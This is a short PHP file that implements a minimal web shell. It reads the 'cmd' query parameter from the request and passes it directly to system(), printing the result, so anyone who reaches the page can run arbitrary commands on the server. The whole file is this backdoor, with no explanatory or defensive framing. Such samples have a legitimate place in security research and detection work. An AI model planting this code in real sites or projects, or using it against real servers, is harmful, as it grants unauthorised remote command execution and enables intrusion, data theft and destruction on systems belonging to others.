<?php
function execute($com)
{
  if(function_exists('system'))
    echo system($com);
}

$cmd = $_GET['cmd'];
execute($cmd);
?>